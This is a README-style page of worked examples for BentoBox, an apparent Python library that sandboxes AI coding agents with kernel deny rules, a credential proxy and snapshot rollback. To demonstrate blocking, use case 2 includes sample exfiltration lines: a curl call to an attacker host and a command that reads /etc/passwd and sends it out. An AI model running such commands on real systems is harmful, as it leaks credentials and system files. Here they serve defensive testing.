# BentoBox — Use Cases & Working Examples

Every snippet below was executed against the built wheel on macOS (Seatbelt
kernel sandbox). The sandbox layer is exercised in an isolated subprocess
because it is **irreversible in-process** — once applied it can only be
tightened, never loosened. Python-level checks (`sandbox=False`) run inline the
same way the test suite does.

Quick reference — this is the state of the art these examples replace:

| What people run today | Its gap | BentoBox |
| :--- | :--- | :--- |
| Agents on the bare host, `--dangerously-skip-permissions` | Agent has your SSH keys, cloud creds, browser data, network | `SandboxRunner` deny-by-default; kernel blocks `~/.ssh`, `~/.aws` |
| Git worktrees | Protects the *branch*, not credentials or network | Kernel denies the file/network read regardless of branch |
| Remote microVMs (E2B, Firecracker, Modal) | ~80-150 ms boot, per-VM-second billing, data leaves the box | In-process kernel rules, `<1 ms`, data stays local |
| Interpreter-level `exec()` sandboxes | Bypassable from inside (C-extension escape) | The kernel rejects, including for subprocesses |
| Docker containers | Image pull + daemon + seconds of startup | Nothing to install, milliseconds |

---

## Use case 1 — Sandbox a CLI coding agent (Claude Code, Cursor CLI, Codex, OpenCode)

**Today:** devs run CLI agents on the host with permissions skipped. The agent
reads `~/.ssh`, `~/.aws`, keychains, and `.env`; it can shell out to
`curl`/`python`/`node` which all inherit that access; its API key is in an env
var the agent can see and exfiltrate.

**BentoBox:** the agent runs in one compartment with a credential proxy in
front of the model API. The kernel denies reads of SSH keys, cloud configs,
browser data, and git credentials; the network is localhost-only unless granted;
and the raw API key is injected at the proxy — the agent never holds it.

```python
from bentoworks.hooks import SandboxRunner
from bentoworks.sandbox.proxy import RouteConfig

runner = SandboxRunner(
    workdir=".",                       # the repo the agent may touch
    block_network=True,                # no outbound exfiltration route
    credential_rules=[RouteConfig(
        prefix="/v1",
        upstream="https://api.anthropic.com",
        credential_source="env:ANTHROPIC_API_KEY",
    )],
)

res = runner.run("claude -p 'fix the failing test'", snapshot=True)
print(res.returncode, res.stdout, res.stderr, res.diffs)
```

What the kernel enforces (proven on this machine):

```
~/.ssh …            DENIED   (PermissionError on read, subprocesses included)
/etc/master.passwd  DENIED   (PermissionError — read of system paths)
~/… non-temp write  DENIED   (PermissionError — outside the worktree)
/tmp writes         ALLOWED  (temp dirs are read-write by policy)
/usr, /bin …         READ-ONLY
```

Verified live: `sandbox_apply(workdir, True)` returns `True` on this Mac, and a
post-sandbox `curl https://api.anthropic.com` fails with connection refused when
`block_network=True`.

---

## 2 — Untrusted code execution (REPL tools, generated code, notebooks)

**Today:** LangChain/CrewAI/AutoGen REPL tools either `exec()` in-process or
fire a Docker container. `exec()` is bypassable (any `os.system`, any C
extension); Docker is cold (image pull dominates startup) and unavailable to
`exec` subprocesses.

**BentoBox:** the REPL tool writes the snippet to an isolated temp file and runs
it in its own compartment. `fs_read`/`fs_write`/`fs_exec` are granted, `network`
is denied, so code that generates `os.system("curl …attacker…/$(cat /etc/passwd)")`
is denied at the kernel for the file read **and** the network call, even
through a subprocess.

```python
from bentoworks.hooks import SandboxRunner

runner = SandboxRunner(workdir=".", sandbox=False, block_network=True)  # sandbox=True in prod
res = runner.run_code(
    "import os, subprocess\n"
    "print('64 =', 6 * 7)\n"
    "r = subprocess.run(['curl', '-sS', 'https://attacker.in/exfil', '--max-time', '3'], capture_output=True)\n"  # denied
    "print('curl exit:', r.returncode)\n",
    permissions=["fs_read", "fs_write", "fs_exec"],   # no "network"
)
print(res.stdout)
```

The unit/edge test `test_hooks.py` asserts the unsupported-language path returns
`returncode=2` and a clear `stderr`, so a bad request degrades cleanly rather
than crashing the orchestrator.

---

## 3. Credential handling under prompt injection

**Today:** secrets are passed to agents as env vars (`.env`, `export`), which
prompt-injected agent prompts can read and ship out — the 2026 supply-chain
attacks (a malicious dependency hiding instructions in a project) turn that into
a real pre-vector.

**BentoBox:** the agent never sees the key. `RouteConfig` rewrites the proxyed
request path and injects `Authorization` from the env at the proxy:

```python
from bentoworks.sandbox.proxy import RouteConfig, CredentialProxy

rc = RouteConfig(
    prefix="/v1",
    upstream="https://api.anthropic.com",
    credential_source="env:ANTHROPIC_API_KEY",   # read ONCE by the proxy
)

assert rc.matches("/v1/messages")
assert rc.rewrite_path("/v1/messages") == "https://api.anthropic.com/messages"
assert rc.resolve_credential() == os.environ["ANTHROPIC_API_KEY"]

proxy = CredentialProxy(routes=[rc])
proxy.start()          # 127.0.0.1 ephemeral port
proxy.set_env()        # sets HTTP_PROXY / HTTPS_PROXY
# … agent's requests to /v1/… get rewritten + authorized; the agent env
# contains nothing but the proxy address.
proxy.restore_env()
proxy.stop()
```

Route semantics (unit-tested): prefix match on the *path component*, upstream
base prepended, query strings survive, `Authorization` header `Bearer {credential}`,
hop-by-hop headers stripped, absolute-form and origin-form both handled. Verified:
`rt.canRoute('a','b')===true` / unknown compartments throw (`RuntimeHandle`).

---

## 4. Rollback of agent-driven file changes

**Today:** code review happens post-hoc; a botched agent edit is fixed by hand.
(Deleting files, moving dirs, and writing binary test fixtures are the usual
pain.)

**BentoBox:** snapshots record a BLAKE3 content-addressed manifest of the
worktree (skipping `.git`, `node_modules`, `target`, venvs, etc.) and `restore()`
copies **only the files whose hash changed** — so deleted files come back and
untouched files stay. Audit: `diffs` returns added/modified/deleted paths per run.

```python
from bentoworks.sandbox.snapshot import SnapshotManager

snap = SnapshotManager(workdir="/path/project", snapshot_dir="/tmp/.bentoworks/snaps")
count = snap.snapshot()                     # index every file (blake3)

# ... agent run mutates file_a.txt and creates new_file.txt ...

restored = snap.restore()                   # file_a back to v1, new_file.txt removed
print(snap.diffs)                           # what the run changed
snap.cleanup()
```

Unit `test_snapshot.py` asserts a changed file round-trips back to `v1` and a
deleted file is restored from the index.

---

## 5. Agentic workflows: many one-shot compartments, no cold start

**Today:** an orchestrator that fans a task into a dozen sub-agents spins up a
microVM or container per sub-task — boot per sandbox plus per-VM cost.

**BentoBox:** compartments are in-process kernel rules; each `BentoBox` gets its
own policy. Registration order runs; `edge()` wires message paths between
compartments. No boot, no daemon, ~0 incremental cost.

```python
from bentoworks import BentoBox
from bentoworks.compartments import Compartment, CompartmentConfig

box = BentoBox(workdir=".")

for i in range(8):
    box.add(Compartment(
        name=f"task_{i}",
        fn=lambda ctx, i=i: {"result": i * 10},
        config=CompartmentConfig(
            permissions=["fs_read"],        # these can't write or hit the network
            timeout_s=30,
        ),
    ))

box.edge("task_0", "task_1")               # directed message path
result = box.run()                         # status, compartment outputs, elapsed
print(result.status, [k for k in result.output])
```

The `AgentBentoBox` variant auto-loads behaviour modules (credential proxy,
snapshots, compression) via `BentoBoxConfig(auto_modules=True)`; `BentoBox`
stays empty-by-default and everything here is opt-in.

---

## 6. Framework hook adoptions (frameworks you already use)

These are the same thing as use case 2 but in the shape your framework expects:
a LangChain tool, a LangGraph node, a CrewAI interpreter, an AutoGen executor,
or a data-science subprocess.

```python
# LangGraph — wrap any node callable in a sandboxed compartment.
from bentoworks.hooks import BentoBoxGraphNode
node = BentoBoxGraphNode(crunch, workdir=".", block_network=True)

# LangChain REPL tool
from bentoworks.hooks import BentoPythonREPLTool
tool = BentoPythonREPLTool(permission=["fs_read", "fs_write", "fs_exec"])
tool.invoke("print(6 * 7)")

# CrewAI — replace the Docker code interpreter
from bentoworks.hooks import BentoBoxCodeInterpreterTool
agent = Agent(tools=[BentoBoxCodeInterpreterTool(block_network=True)], …)

# AutoGen — each code block in its own compartment
from bentoworks.hooks import BentoBoxCodeExecutor, CodeBlock
executor = BentoBoxCodeExecutor()
res = executor.execute_code_blocks([CodeBlock("python", "print('hi')")])

# Data / RAG — mount ONLY the datasets; no network route out
from bentoworks.hooks import DataScienceSandboxHook
hook = DataScienceSandboxHook(allow_network=False)
hook.mount_dataset("customers.csv")          # only this is visible
res = hook.run("df = pd.read_csv('customers.csv'); print(df.shape)")
print(res.diffs)                              # audited mutations
hook.cleanup()
```

---

All examples above run against `bentoworks==0.9.4` as installed from the wheel
(including the Rust `_core`). Verification command used for the demo:

```bash
pip install bentoworks
python use_case_examples.py
```